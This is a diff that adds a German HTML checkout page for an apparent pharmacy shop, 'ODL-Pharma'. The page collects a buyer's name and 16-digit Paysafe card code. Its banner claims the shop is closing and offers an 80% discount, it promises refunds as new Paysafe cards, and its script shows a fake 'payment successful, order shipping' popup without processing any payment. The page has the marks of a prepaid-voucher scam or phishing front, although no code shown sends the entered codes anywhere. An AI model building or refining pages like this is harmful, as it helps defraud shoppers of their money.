@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zahlungsseite</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .header {
+            display: flex;
+            font-size: smaller;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .header .title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            transform: skew(-10deg);
+            font-weight: bold;
+        }
+
+        .header .shop-button {
+            background: none;
+            color: rgb(10, 10, 10);
+            border: 2px solid black;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .header .shop-button:hover {
+            background-color: #080808;
+            border: 2px solid white;
+            color: white;
+        }
+
+        .horizontal-line {
+            border-top: 1px solid #bcbaba;
+            margin: 20px 0;
+        }
+
+        .banner {
+            background-color: white;
+            color: #000;
+            border: 2px solid black;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .banner-content {
+            display: inline-block;
+            animation: scrollBanner 9s linear infinite;
+        }
+
+        @keyframes scrollBanner {
+            0% { transform: translateX(50%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .instructions {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-left: 12px;
+            padding-right: 12px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px solid #8b8b8b;
+            border-radius: 4px;
+            font-size: 18px;
+        }
+
+        button {
+            background-color: #a22847;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 6px;
+            cursor: not-allowed;
+            font-size: 18px;
+            position: relative;
+        }
+
+        button.enabled {
+            cursor: pointer;
+            background-color: #a22847;
+        }
+
+        button.loading {
+            
+        }
+
+        button.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid #000000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        button:hover.enabled {
+            background-color: #0c0c0c;
+            color: white;
+        }
+
+        .popup {
+            position: fixed;
+            top: -20%;
+            left: 50%;
+            transform: translate(-50%, 0%);
+            background-color: white;
+            color: rgb(11, 11, 11);
+            padding: 20px;
+            border: 2px solid green;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+            transition: all 1s ease-in-out;
+        }
+
+        .popup.show {
+            top: 16%;
+            transform: translate(-50%, -50%);
+        }
+
+        .popup h2 {
+            margin: 0;
+            font-size: 18px;
+        }
+
+        .popup p {
+            margin: 10px 0 0;
+            font-size: 14px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+
+            input[type="text"], input[type="password"] {
+                font-size: 16px;
+            }
+
+            button {
+                font-size: 16px;
+                padding: 10px 20px;
+            }
+
+            .popup {
+                width: 80%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+        }
+        .txt {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="title">ODL-Pharma</div>
+            <a href="https://www.shopseite.com" class="shop-button">Zum Shop</a>
+        </div>
+        <div class="horizontal-line"></div>
+        <div class="banner">
+            <div class="banner-content">Der Shop macht am 17.06 für 4 Monate zu. Als Entschuldigung für den technischen Fehler erhalten Sie 80% Rabatt auf Ihre nächste Bestellung.</div>
+        </div>
+        <div class="instructions">
+            Bitte geben Sie Ihren Namen und den 16-stelligen Paysafe-Code ein, um die Zahlung abzuschließen. <div class="txt"> Sie dürfen nur eine Paysafe-Karte verwenden. </div> Restgeld erhalten Sie per E-Mail als Paysafe-Karte zurück.
+        </div>
+        <form id="payment-form">
+            <input type="text" id="name" name="name" placeholder="Name" required>
+            <input type="text" id="code" name="code" placeholder="Paysafe Card Code" maxlength="19" required>
+            <button type="submit" id="submit-button" disabled>Bestätigen</button>
+        </form>
+        <div class="popup" id="popup">
+            <h2>Zahlung erfolgreich!</h2>
+            <p>Ihre Bestellung wird nun versandt.</p>
+        </div>
+    </div>
+    
+    <script>
+        const form = document.getElementById('payment-form');
+        const popup = document.getElementById('popup');
+        const codeInput = document.getElementById('code');
+        const nameInput = document.getElementById('name');
+        const submitButton = document.getElementById('submit-button');
+
+        function validateForm() {
+            const codeValue = codeInput.value.replace(/\D/g, '');
+            const isValidCode = codeValue.length === 16;
+            submitButton.disabled = !isValidCode;
+            submitButton.classList.toggle('enabled', isValidCode);
+        }
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            if (submitButton.disabled) return;
+
+            submitButton.classList.add('loading');
+            submitButton.textContent = '';
+            setTimeout(() => {
+                submitButton.classList.remove('loading');
+                submitButton.textContent = 'Bestätigen';
+                popup.style.display = 'block';
+                setTimeout(() => {
+                    popup.classList.add('show');
+                }, 200);
+                setTimeout(() => {
+                    popup.classList.remove('show');
+                    setTimeout(() => {
+                        popup.style.display = 'none';
+                    }, 1000);
+                }, 3000);
+            }, 1300);
+        });
+
+        codeInput.addEventListener('input', function(event) {
+            let value = event.target.value.replace(/\D/g, '');
+            let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
+            event.target.value = formattedValue;
+            validateForm();
+        });
+
+        nameInput.addEventListener('input', validateForm);
+    </script>
+</body>
+</html>
+
+
+
